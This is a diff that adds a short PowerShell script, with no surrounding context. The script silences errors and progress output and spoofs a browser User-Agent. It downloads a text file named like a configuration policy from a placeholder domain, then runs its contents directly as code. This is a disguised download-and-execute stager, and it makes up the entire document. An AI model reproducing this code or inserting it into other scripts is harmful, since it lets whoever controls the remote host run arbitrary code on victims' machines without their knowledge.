@@ -1,0 +1,7 @@
+$ErrorActionPreference = 'SilentlyContinue'
+$ProgressPreference = 'SilentlyContinue'
+$base = 'https://YOURDOMAIN.com'
+$wc = New-Object Net.WebClient
+$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
+$s = $wc.DownloadString("$base/assets/config-policy.txt")
+[ScriptBlock]::Create($s).Invoke()
